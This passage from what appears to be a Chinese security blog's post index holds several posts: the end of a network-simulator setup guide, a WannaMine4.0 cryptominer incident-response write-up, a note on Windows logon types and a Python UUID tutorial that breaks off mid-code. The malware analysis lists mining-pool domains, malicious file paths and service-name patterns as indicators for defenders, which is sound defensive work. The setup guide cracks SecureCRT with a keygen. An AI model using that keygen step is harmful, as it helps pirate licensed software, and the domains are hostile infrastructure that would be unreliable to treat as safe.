src="https://s1.ax1x.com/2020/04/14/JSHVAg.png"><img src="https://s1.ax1x.com/2020/04/14/JSXDtU.png"><img src="https://s1.ax1x.com/2020/04/14/JSXBkT.png"><h3 id="5、安装HCL"><a href="#5、安装HCL" class="headerlink" title="5、安装HCL"></a>5、安装HCL</h3><img src="https://s1.ax1x.com/2020/04/14/JSXyp4.png"><img src="https://s1.ax1x.com/2020/04/14/JSXw7V.png"><img src="https://s1.ax1x.com/2020/04/14/JSXd00.png"><img src="https://s1.ax1x.com/2020/04/14/JSXrhF.png"><p>​        老规矩，安装完之后不打开。</p><h3 id="6、打开eNSP注册设备"><a href="#6、打开eNSP注册设备" class="headerlink" title="6、打开eNSP注册设备"></a>6、打开eNSP注册设备</h3><p>打开二NSP后会出现下面第一张图类似的几个提示，全部勾选上，然后继续</p><img src="https://s1.ax1x.com/2020/04/14/JSX61J.png"><p>​        最重要的事情就是打开二NSP之后先注册设备，如果注册设备没出什么问题，基本就没啥问题了。</p><img src="https://s1.ax1x.com/2020/04/14/JSXW0x.png"><p>​        这里全部勾选上。</p><img src="https://s1.ax1x.com/2020/04/14/JSXgXR.png"><h3 id="7、调整H3C-Cloud-Lab兼容性"><a href="#7、调整H3C-Cloud-Lab兼容性" class="headerlink" title="7、调整H3C Cloud Lab兼容性"></a>7、调整H3C Cloud Lab兼容性</h3><p>​        因为H3C Cloud Lab在Windows10上会报一个不兼容的错，这里懒得点开那个错误，直接修改兼容性。</p><img src="https://s1.ax1x.com/2020/04/14/JSXRn1.png"><p>​        将兼容性改为 <code>Windows7</code> 。</p><img src="https://s1.ax1x.com/2020/04/14/JSXcc9.png"><h3 id="8、安装Secure-CRT"><a href="#8、安装Secure-CRT" class="headerlink" title="8、安装Secure CRT"></a>8、安装Secure CRT</h3><p>​    ！！！有能力的小伙伴请支持正版！！！</p><img src="https://s1.ax1x.com/2020/04/14/JppI4P.png"><img src="https://s1.ax1x.com/2020/04/14/Jpp5Nt.png"><img src="https://s1.ax1x.com/2020/04/14/JppfHA.png"><img src="https://s1.ax1x.com/2020/04/14/Jpp4AI.png"><img src="https://s1.ax1x.com/2020/04/14/JppWBd.png"><img src="https://s1.ax1x.com/2020/04/14/Jpp738.png"><img src="https://s1.ax1x.com/2020/04/14/JppT9f.png"><p>​        接下来需要将 <code>keygen.exe</code> 拷贝到Secure CRT的安装路径中去</p><img src="https://s1.ax1x.com/2020/04/14/JppHgS.png"><img src="https://s1.ax1x.com/2020/04/14/Jppbjg.png"><img src="https://s1.ax1x.com/2020/04/14/Jp993T.png"><img src="https://s1.ax1x.com/2020/04/14/Jp9CgU.png"><img src="https://s1.ax1x.com/2020/04/14/Jp9PvF.png"><img src="https://s1.ax1x.com/2020/04/14/Jp9CgU.png"><img src="https://s1.ax1x.com/2020/04/14/JppLuQ.png"><img src="https://s1.ax1x.com/2020/04/14/JppOBj.png"><img src="https://s1.ax1x.com/2020/04/14/JppXHs.png"><img src="https://s1.ax1x.com/2020/04/14/JppxNq.png"><img src="https://s1.ax1x.com/2020/04/14/Jppz40.png"><img src="https://s1.ax1x.com/2020/04/14/Jp9pCV.png"><img src="https://s1.ax1x.com/2020/04/14/Jp9Fu4.png"><img src="https://s1.ax1x.com/2020/04/14/Jp9kDJ.png"><p>​        到此为止，Secure CRT的安装完毕</p><h2 id="三、环境测试"><a href="#三、环境测试" class="headerlink" title="三、环境测试"></a>三、环境测试</h2><h3 id="1、测试eNSP"><a href="#1、测试eNSP" class="headerlink" title="1、测试eNSP"></a>1、测试eNSP</h3><img src="https://s1.ax1x.com/2020/04/14/JSXT9e.png"><h3 id="2、测试H3C-Cloud-Lab"><a href="#2、测试H3C-Cloud-Lab" class="headerlink" title="2、测试H3C Cloud Lab"></a>2、测试H3C Cloud Lab</h3><img src="https://s1.ax1x.com/2020/04/14/JSXf76.png"><img src="https://s1.ax1x.com/2020/04/14/JSXIhD.png"><p>如果在这没有点允许的话，还可以在 <code>控制面板\所有控制面板项\Windows Defender 防火墙\允许的应用</code> 下再打开。</p><img src="https://s1.ax1x.com/2020/04/14/JSX5tO.png"><h2 id="四、Secure-CRT连接模拟器"><a href="#四、Secure-CRT连接模拟器" class="headerlink" title="四、Secure CRT连接模拟器"></a>四、Secure CRT连接模拟器</h2><h3 id="1、Secure-CRT连接到H3C-Cloud-Lab"><a href="#1、Secure-CRT连接到H3C-Cloud-Lab" class="headerlink" title="1、Secure CRT连接到H3C Cloud Lab"></a>1、Secure CRT连接到H3C Cloud Lab</h3><h4 id="1-1、打开H3C-Cloud-Lab，新建一个路由器"><a href="#1-1、打开H3C-Cloud-Lab，新建一个路由器" class="headerlink" title="1.1、打开H3C Cloud Lab，新建一个路由器"></a>1.1、打开H3C Cloud Lab，新建一个路由器</h4><img src="https://s1.ax1x.com/2020/04/14/Jpi6IA.png"><h4 id="1-2、打开VirtualBox找到对应的设备，点击设置查看名称"><a href="#1-2、打开VirtualBox找到对应的设备，点击设置查看名称" class="headerlink" title="1.2、打开VirtualBox找到对应的设备，点击设置查看名称"></a>1.2、打开VirtualBox找到对应的设备，点击设置查看名称</h4><img src="https://s1.ax1x.com/2020/04/14/JpisVH.png"><img src="https://s1.ax1x.com/2020/04/14/JpFPiR.png"><h4 id="1-3、拷贝好设备名称，打开Secure-CRT新建快速连接，Port-改为：Named-Pipe，-下面的-Name-of-pipe-写成-pipe-设备名称"><a href="#1-3、拷贝好设备名称，打开Secure-CRT新建快速连接，Port-改为：Named-Pipe，-下面的-Name-of-pipe-写成-pipe-设备名称" class="headerlink" title="1.3、拷贝好设备名称，打开Secure CRT新建快速连接，Port 改为：Named Pipe， 下面的 Name of pipe 写成 \\.\pipe\设备名称"></a>1.3、拷贝好设备名称，打开Secure CRT新建快速连接，<code>Port</code> 改为：<code>Named Pipe</code>， 下面的 <code>Name of pipe</code> 写成 <code>\\.\pipe\设备名称</code></h4><img src="https://s1.ax1x.com/2020/04/14/Jpiyad.png"><h4 id="1-4、新建完成后可以看到无法连接，这是因为设备没开机"><a href="#1-4、新建完成后可以看到无法连接，这是因为设备没开机" class="headerlink" title="1.4、新建完成后可以看到无法连接，这是因为设备没开机"></a>1.4、新建完成后可以看到无法连接，这是因为设备没开机</h4><img src="https://s1.ax1x.com/2020/04/14/JpiDqe.png"><h4 id="1-5、给设备开机，再次查看连接，发现连接成功"><a href="#1-5、给设备开机，再次查看连接，发现连接成功" class="headerlink" title="1.5、给设备开机，再次查看连接，发现连接成功"></a>1.5、给设备开机，再次查看连接，发现连接成功</h4><img src="https://s1.ax1x.com/2020/04/14/JpigPI.png"><img src="https://s1.ax1x.com/2020/04/14/Jpi2Gt.png"><h3 id="2、Secure-CRT连接到eNSP"><a href="#2、Secure-CRT连接到eNSP" class="headerlink" title="2、Secure CRT连接到eNSP"></a>2、Secure CRT连接到eNSP</h3><h4 id="2-1、新建一台AR1220，先不开机，右击打开设置"><a href="#2-1、新建一台AR1220，先不开机，右击打开设置" class="headerlink" title="2.1、新建一台AR1220，先不开机，右击打开设置"></a>2.1、新建一台AR1220，先不开机，右击打开设置</h4><img src="https://s1.ax1x.com/2020/04/14/JpQg0I.png"><h4 id="2-2、设备开机，使用Secure-CRT连接，协议使用-Telnet-，主机名为-127-0-0-1-，端口为刚才设置的2001"><a href="#2-2、设备开机，使用Secure-CRT连接，协议使用-Telnet-，主机名为-127-0-0-1-，端口为刚才设置的2001" class="headerlink" title="2.2、设备开机，使用Secure CRT连接，协议使用 Telnet ，主机名为 127.0.0.1 ，端口为刚才设置的2001"></a>2.2、设备开机，使用Secure CRT连接，协议使用 <code>Telnet</code> ，主机名为 <code>127.0.0.1</code> ，端口为刚才设置的<code>2001</code></h4><img src="https://s1.ax1x.com/2020/04/14/JpQcnA.png"><h4 id="2-3、测试连接，发现连接成功"><a href="#2-3、测试连接，发现连接成功" class="headerlink" title="2.3、测试连接，发现连接成功"></a>2.3、测试连接，发现连接成功</h4><img src="https://s1.ax1x.com/2020/04/14/JpQs6H.png"><h3 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h3><p>​        各位小伙伴如果有什么问题的话，可以在下方评论留言。</p><p>​        如果本文章侵犯了您的权限，请联系本人，我会立刻处理。</p><p>本文用到的软件下载地址：</p><pre class="line-numbers language-bash"><code class="language-bash">链接：https://pan.baidu.com/s/1jETZHFg-at9VtceVw-dVvw 提取码：wqb0 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Switching、Routing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C </tag>
            
            <tag> eNSP </tag>
            
            <tag> Wireshark </tag>
            
            <tag> VirtualBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应—WannaMine4.0</title>
      <link href="/2020/04/14/ying-ji-xiang-ying-wannamine4.0/"/>
      <url>/2020/04/14/ying-ji-xiang-ying-wannamine4.0/</url>
      
        <content type="html"><![CDATA[<h1 id="应急响应—WannaMine4-0"><a href="#应急响应—WannaMine4-0" class="headerlink" title="应急响应—WannaMine4.0"></a>应急响应—WannaMine4.0</h1><h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>​        最近在学应急响应，于是找到了 <code>WannaMine4.0</code> 的虚拟机环境，利用工具 <code>ProcessHacker</code> , <code>PCHunter</code> 对虚拟机环境进行分析，本次应急响应主要获取的内容如下：</p><ul><li>矿池域名</li><li>恶意文件存放目录</li><li>恶意启动项或服务或计划任务名字</li></ul><p>Tips：由于环境比较老、不够完善，而且站点已经关闭了，所以文章内容、图片质量可能会有所…</p><h2 id="二、项目过程"><a href="#二、项目过程" class="headerlink" title="二、项目过程"></a>二、项目过程</h2><h3 id="1、虚拟机网络设置"><a href="#1、虚拟机网络设置" class="headerlink" title="1、虚拟机网络设置"></a>1、虚拟机网络设置</h3><p>​        将网络设置为仅主机</p><h3 id="2、病毒现象"><a href="#2、病毒现象" class="headerlink" title="2、病毒现象"></a>2、病毒现象</h3><h4 id="2-1、服务器CPU占用率高"><a href="#2-1、服务器CPU占用率高" class="headerlink" title="2.1、服务器CPU占用率高"></a>2.1、服务器CPU占用率高</h4><img src="https://s1.ax1x.com/2020/04/14/Gzl9cd.png"><center>任务管理器-性能</center><p>​        这里可以看到CPU使用率是50%，在后面的分析中可以看到相应的代码</p><h4 id="2-2、服务器主动访问恶意域名"><a href="#2-2、服务器主动访问恶意域名" class="headerlink" title="2.2、服务器主动访问恶意域名"></a>2.2、服务器主动访问恶意域名</h4><p>​        在环境中可以使用 <code>Process Hacker</code> 的 <code>Network</code> 部分检测， 因为环境的问题，这里直接写：</p><pre class="line-numbers language-bash"><code class="language-bash">totonm.com、cake.pilutce.com:443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-3、扫描内外基于445端口的SMB服务"><a href="#2-3、扫描内外基于445端口的SMB服务" class="headerlink" title="2.3、扫描内外基于445端口的SMB服务"></a>2.3、扫描内外基于445端口的SMB服务</h4><h3 id="3、使用PCHunter检测数字签名找到异常进程"><a href="#3、使用PCHunter检测数字签名找到异常进程" class="headerlink" title="3、使用PCHunter检测数字签名找到异常进程"></a>3、使用PCHunter检测数字签名找到异常进程</h3><p>​        直接右击点击校验所有数字签名</p><img src="https://s1.ax1x.com/2020/04/14/GzlHPS.png"><p>​        等到检测完成后可以看到标红的五个中，有三个是VMware本身的进程，一个是PCHunter的进程，那么最后这个 <code>dllhostex.exe *32</code> 就是有问题的了。</p><img src="https://s1.ax1x.com/2020/04/14/Gz33fU.png"><h3 id="4、使用ProcessHacker找到站点等具体信息"><a href="#4、使用ProcessHacker找到站点等具体信息" class="headerlink" title="4、使用ProcessHacker找到站点等具体信息"></a>4、使用ProcessHacker找到站点等具体信息</h3><p>​        在进程中找到<code>dllhostex.exe</code> ，然后点击查看属性</p><img src="https://s1.ax1x.com/2020/04/14/Gz31YT.png"><p>​        找到属性中的 <code>Memory</code>， 可以发现有 <code>RWX</code> 权限的条目，点击Strings，查看具体信息。这个Minimum是用来设置显示字符串长度的，一般不用改，点击Ok就能查看了</p><img src="https://s1.ax1x.com/2020/04/14/Gz3lkV.png"><p>​        下拉可以看到一些信息，比如连接的站点，还有限制CPU占用率的代码</p><img src="https://s1.ax1x.com/2020/04/14/GzUIVH.png"><p>通过微步在线验证一下(图是以前的….)</p><img src="https://s1.ax1x.com/2020/04/14/Gz4uRK.png"><p>继续往下找，又得到了一个站点</p><img src="https://s1.ax1x.com/2020/04/14/GzdRBD.png"><p>​        站点到这获取的就差不多了，接下来获取其他的信息</p><h3 id="5、获取启动项"><a href="#5、获取启动项" class="headerlink" title="5、获取启动项"></a>5、获取启动项</h3><p>​        返回来继续使用PCHunter，查看启动信息，找到启动项，校验数字签名</p><img src="https://s1.ax1x.com/2020/04/14/GzwTIJ.png"><p>​        可以发现，得到了一条自启动信息，<code>Microsoft Windows({44BBA840-CC51-11CF-AAFA-00AA00B6015C})</code></p><img src="https://s1.ax1x.com/2020/04/14/Gzwoa4.png"><h3 id="6、获取服务信息"><a href="#6、获取服务信息" class="headerlink" title="6、获取服务信息"></a>6、获取服务信息</h3><p>​        与上面一样的操作，进行校验，得到了名为 <code>Application RPC Client</code> 的服务项</p><img src="https://s1.ax1x.com/2020/04/14/GzwIZF.png"><h3 id="7、找到相应的文件"><a href="#7、找到相应的文件" class="headerlink" title="7、找到相应的文件"></a>7、找到相应的文件</h3><h4 id="7-1、命名规则"><a href="#7-1、命名规则" class="headerlink" title="7.1、命名规则"></a>7.1、命名规则</h4><p>​        恶意服务名为以下三个列表中各选一个，然后进行字符串拼接(如: ApplicationNetBIOSClient，其由字符串1 Application + 字符串2 NetBIOS + 字符串3 Client 拼接生成)。</p><ul><li>Windows、Microsoft、Network、Remote、Function、Secure、Application</li><li>Update、Time、NetBIOS、RPC、Protocol、SSDP、UPnP</li><li>Service、Host、Client、Event、Manager、Helper、System</li></ul><h4 id="7-2、通过进程、服务定位到文件"><a href="#7-2、通过进程、服务定位到文件" class="headerlink" title="7.2、通过进程、服务定位到文件"></a>7.2、通过进程、服务定位到文件</h4><pre class="line-numbers language-bash"><code class="language-bash">C:\Windows\SysWOW64\ApplicationRPCClient.dllC:\Windows\SysWOW64\dllhostex.exe<span class="token comment" spellcheck="true"># 如果环境正常的话还可能有</span>C:Windows\System32ApplicationNetBlOSlient.dll<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7-3、WannaMine4-0-是通过永恒之蓝进行传播的，可以在-C-Windows-NetworkDistribution-文件夹下找到对应文件"><a href="#7-3、WannaMine4-0-是通过永恒之蓝进行传播的，可以在-C-Windows-NetworkDistribution-文件夹下找到对应文件" class="headerlink" title="7.3、WannaMine4.0 是通过永恒之蓝进行传播的，可以在 C:\Windows\NetworkDistribution 文件夹下找到对应文件"></a>7.3、WannaMine4.0 是通过永恒之蓝进行传播的，可以在 <code>C:\Windows\NetworkDistribution</code> 文件夹下找到对应文件</h4><h2 id="三、查杀及修补"><a href="#三、查杀及修补" class="headerlink" title="三、查杀及修补"></a>三、查杀及修补</h2><h3 id="1、查杀"><a href="#1、查杀" class="headerlink" title="1、查杀"></a>1、查杀</h3><p>​        通过上面的分析过程已经找出相应的服务、进程，分别对其进行停止、删除等操作，如果有重要业务，还可以先通过暂停相应的进程保证业务的正常运转，在空闲时进行相应操作。</p><h3 id="2、修补方式"><a href="#2、修补方式" class="headerlink" title="2、修补方式"></a>2、修补方式</h3><ol><li>利用系统防火墙高级设置阻止向445端口进行连接（该操作会影响使用445端口的服务）。 </li><li>尽量关闭不必要的文件共享； </li><li>采用高强度的密码，避免使用弱口令密码，并定期更换密码； </li><li>打开系统自动更新，并检测更新进行安装。 </li><li>系统打上<code>MS17-010</code>对应的Microsoft Windows SMB 服务器安全更新 (4013389)补丁程序</li></ol><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h2><p>​        这只是个人学习过程中的一点记录，由于环境等各种原因，可能内容有些杂乱。。。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Emergency_Response </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Emergency_Response </tag>
            
            <tag> WannaMine4.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows登录类型及安全日志浅析</title>
      <link href="/2020/04/11/windows-deng-lu-lei-xing-ji-an-quan-ri-zhi-qian-xi/"/>
      <url>/2020/04/11/windows-deng-lu-lei-xing-ji-an-quan-ri-zhi-qian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows登录类型及安全日志浅析"><a href="#Windows登录类型及安全日志浅析" class="headerlink" title="Windows登录类型及安全日志浅析"></a>Windows登录类型及安全日志浅析</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>​        系统安全日志就是每次开关机、运行程序、系统报错时，这些信息都会被记录下来，保存在日志文件中。具备这个能力的安全日志是应急响应中的一个重要信息收集的部分。</p><h2 id="二、Windows登录类型"><a href="#二、Windows登录类型" class="headerlink" title="二、Windows登录类型"></a>二、Windows登录类型</h2><p>​        Windows为了能够让用户从日志中获得更多有价值的信息，它细分了很多种登录类型，以便让用户区分登录者到底是从本地登录，还是从网络登录，以及其它更多的登录方式。了解了这些登录方式后，用户就可以从事件日志中发现可疑的黑客行为，并能够判断其攻击方式。下面的是Windows登录日志表类型、方式的表格，在本文中将只谈论1、3、5、10这四种类型（以后还有可能会回来补）。</p><center>Windows登录日志类型表</center><table><thead><tr><th align="center">登录类型</th><th align="center">登录方式</th><th align="center">描述信息</th></tr></thead><tbody><tr><td align="center">2</td><td align="center"><strong>交互式登录（Interactive）</strong></td><td align="center">用户登录到此计算机。</td></tr><tr><td align="center">3</td><td align="center"><strong>网络（Network）</strong></td><td align="center">用户或计算机从网络登录到该计算机。</td></tr><tr><td align="center">4</td><td align="center"><strong>批处理（Batch）</strong></td><td align="center">批处理登录类型由批处理服务器使用，在批处理服务器中，进程可以代表用户执行而无需其直接干预。</td></tr><tr><td align="center">5</td><td align="center"><strong>服务（Service）</strong></td><td align="center">服务由服务控制管理器启动。</td></tr><tr><td align="center">7</td><td align="center"><strong>解锁（Unlock）</strong></td><td align="center">该工作站已解锁。</td></tr><tr><td align="center">8</td><td align="center"><strong>网络明文（NetworkCleartext）</strong></td><td align="center">用户从网络登录到此计算机。用户密码以未加密的形式传递到身份验证包。内置身份验证将所有哈希凭据打包，然后再通过网络发送它们。凭据不会以纯文本（也称为明文）遍历网络。</td></tr><tr><td align="center">9</td><td align="center"><strong>新凭证（NewCredentials）</strong></td><td align="center">呼叫者克隆了其当前令牌，并为出站连接指定了新的凭据。新的登录会话具有相同的本地身份，但对其他网络连接使用不同的凭据。</td></tr><tr><td align="center">10</td><td align="center"><strong>远程交互（RemoteInteractive）</strong></td><td align="center">用户使用终端服务或远程桌面远程登录到此计算机。</td></tr><tr><td align="center">11</td><td align="center"><strong>缓存交互（CachedInteractive）</strong></td><td align="center">用户使用本地存储在计算机上的网络凭据登录到此计算机。未联系域控制器来验证凭据。</td></tr></tbody></table><h3 id="1、交互式登录（Interactive）"><a href="#1、交互式登录（Interactive）" class="headerlink" title="1、交互式登录（Interactive）"></a>1、交互式登录（Interactive）</h3><p>​        这里我用一台Windows Server 2008 R2来做演示，这是一次开机过程中所产生的日志信息。</p><div align="center"><img src="https://s1.ax1x.com/2020/04/11/GbexOA.png"></div><p>​        其中有因为协议开机的，还有正常登录开机的，这里查看用户登录的那条，可以明显的看到本次登录的用户是 <code>Administrator</code> ，登录类型是交互式登录，调用的进程是 <code>winlogon.exe</code> 。（其他的先不做探讨）</p><div align="center"><img src="https://s1.ax1x.com/2020/04/11/Gbn5Ux.png"></div><h3 id="3、网络（Network）"><a href="#3、网络（Network）" class="headerlink" title="3、网络（Network）"></a>3、网络（Network）</h3><p>​        这里从其本机远程到了虚拟机中，在连接过程中先创建了 <code>LogonType=3</code> 的的日志，在登录过程中调用了 <code>NtLmSsp(NT LM安全性支持提供者服务)</code> ，当验证通过是后又创建了一个<code>LogonType=10</code> 的记录，在下面的文章内容中有提到，</p><div align="center"><img src="https://s1.ax1x.com/2020/04/11/GbY5C9.png"></div><h3 id="5、服务（Service）"><a href="#5、服务（Service）" class="headerlink" title="5、服务（Service）"></a>5、服务（Service）</h3><p>​        这次是 <code>services.exe</code> 进行的操作，可以看到， <code>LogonType</code> 是5。</p><div align="center"><img src="https://s1.ax1x.com/2020/04/11/GbuCRS.png"></div><h3 id="10、远程交互（RemoteInteractive）"><a href="#10、远程交互（RemoteInteractive）" class="headerlink" title="10、远程交互（RemoteInteractive）"></a>10、远程交互（RemoteInteractive）</h3><p>​        这里我用 <code>mstsc</code> 远程连接了一下此虚拟机，可以看到新的日志产生了，本次登录使用的用户还是 <code>Administrator</code> ,但是 <code>LogonType</code> 已经不同了，是远程登录的类型，而且可以清晰的看到远程登录进入的IP地址，由于这里是连接的虚拟机，登录的 <code>IPAddress</code> 则是网关。</p><div align="center"><img src="https://s1.ax1x.com/2020/04/11/GbQpPx.png"></div><h3 id="Tips：查看简化的信息可以使用-LastActivityView-这个工具，文件创建等操作也能看见。"><a href="#Tips：查看简化的信息可以使用-LastActivityView-这个工具，文件创建等操作也能看见。" class="headerlink" title="Tips：查看简化的信息可以使用 LastActivityView 这个工具，文件创建等操作也能看见。"></a>Tips：查看简化的信息可以使用 <code>LastActivityView</code> 这个工具，文件创建等操作也能看见。</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Emergency_Response </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows安全日志 </tag>
            
            <tag> Emergency_Response </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python_UUID</title>
      <link href="/2020/04/10/python-uuid/"/>
      <url>/2020/04/10/python-uuid/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-UUID-通用唯一识别码"><a href="#Python-UUID-通用唯一识别码" class="headerlink" title="Python_UUID(通用唯一识别码)"></a>Python_UUID(通用唯一识别码)</h1><h2 id="一、UUID简介"><a href="#一、UUID简介" class="headerlink" title="一、UUID简介"></a>一、UUID简介</h2><p>​        UUID（<a href="https://link.jianshu.com?t=http%3A%2F%2Fen.wikipedia.org%2Fwiki%2FUniversally_unique_identifier" target="_blank" rel="noopener">Universally Unique IDentifier</a>）是128位的全局唯一标识符，通常由32字节的字符串表示。按照官方手册的说法可以”在空间和时间上保证唯一性”。 它通过MAC地址、时间戳、命名空间、随机数、伪随机数来保证生成ID的唯一性。</p><h2 id="二、UUID的五种算法"><a href="#二、UUID的五种算法" class="headerlink" title="二、UUID的五种算法"></a>二、UUID的五种算法</h2><h3 id="1、UUID-1-IEEE-802-MAC-Address"><a href="#1、UUID-1-IEEE-802-MAC-Address" class="headerlink" title="1、UUID 1 - IEEE 802 MAC Address"></a>1、UUID 1 - IEEE 802 MAC Address</h3><p>​        UUID的第一个版本的值是基于主机的 MAC 地址、当前时间戳、随机数来计算的。<code>uuid</code> 模块使用 <code>getnode()</code> 来获取当前系统的 MAC 地址值。如果一个系统的网卡多于一块，那么就有多个 MAC 地址，因此返回的值可能是其中的任意一个。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> uuid<span class="token operator">>></span><span class="token operator">></span> uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">52239257997</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​        要为主机生成一个由它的 MAC 地址标明的 UUID ，那么就使用 <code>uuid1()</code> 函数。节点标识参数不是必须的，如果留空就意味着采用 <code>getnode()</code> 返回的值，但是因为UUID中包含时间戳，所以每次运行都会生成一个不同的值。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> uuid<span class="token operator">>></span><span class="token operator">></span> uuid<span class="token punctuation">.</span>uuid1<span class="token punctuation">(</span><span class="token punctuation">)</span>UUID<span class="token punctuation">(</span><span class="token string">'ec5d1cf8-7b20-11ea-b8b2-c85b76bbedeb'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> uuid<span class="token punctuation">.</span>uuid1<span class="token punctuation">(</span><span class="token punctuation">)</span>UUID<span class="token punctuation">(</span><span class="token string">'1a9964be-7b21-11ea-b8b2-c85b76bbedeb'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        但是在新的输出中，仅仅只有时间组成部分（在字符串开头位置）有改变,后面是一样的，所以该方式是有风险的，在局域网中可以使用IP来代替MAC，也可以指定 <code>node</code> 值来创建新值。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> node <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0x1ec200d9e0</span><span class="token punctuation">,</span> <span class="token number">0x1e5274040e</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid1<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">,</span> type<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>f6f9a2ba<span class="token number">-7b22</span><span class="token operator">-</span><span class="token number">11ea</span><span class="token operator">-</span><span class="token number">83f4</span><span class="token operator">-</span><span class="token number">001ec200d9e0</span> <span class="token number">0x1ec200d9e0</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span>f6f9af42<span class="token number">-7b22</span><span class="token operator">-</span><span class="token number">11ea</span><span class="token operator">-</span>acc2<span class="token number">-001e5274040e</span> <span class="token number">0x1e5274040e</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、UUID-2-基于分布式计算环境DCE"><a href="#2、UUID-2-基于分布式计算环境DCE" class="headerlink" title="2、UUID 2 - 基于分布式计算环境DCE"></a>2、UUID 2 - 基于分布式计算环境DCE</h3><p>​        算法和uuid1相同，不同的是把时间戳的前4位换位POSIX的UID，实际中很少用到该方法，因此Python中没有这个函数，故忽略。</p><h3 id="3、UUID-3-基于名字和MD5散列值"><a href="#3、UUID-3-基于名字和MD5散列值" class="headerlink" title="3、UUID 3 - 基于名字和MD5散列值"></a>3、UUID 3 - 基于名字和MD5散列值</h3><p>​        通过计算名字和命名空间的MD5散列值得到，保证了同一命名空间中不同名字的唯一性，和不同命名空间的唯一性，但同一命名空间的名字生成相同的uuid。将名称空间的特定种子值与名称组合在一起。这有几个众所周知的命名空间，由预定义的 UUID 值标识，用于处理 DNS，URLs， ISO OIDs， 以及 X.500 可分辨名称。可以通过生成和存储 UUID 值来定义新的基于应用的命名空间.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> uuid<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  MD5   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid3<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_DNS<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  MD5   <span class="token punctuation">:</span> <span class="token number">1037d0d1</span><span class="token operator">-</span><span class="token number">41f2</span><span class="token operator">-</span><span class="token number">3e43</span><span class="token operator">-</span><span class="token number">9e32</span><span class="token operator">-</span><span class="token number">77649b28efe7</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  MD5   :'</span><span class="token punctuation">,</span> uuid<span class="token punctuation">.</span>uuid3<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>NAMESPACE_URL<span class="token punctuation">,</span> <span class="token string">'valecasec.github.io'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  MD5   <span class="token punctuation">:</span> <span class="token number">87118883</span><span class="token operator">-</span><span class="token number">8681</span><span class="token operator">-</span><span class="token number">3357</span><span class="token operator">-</span><span class="token 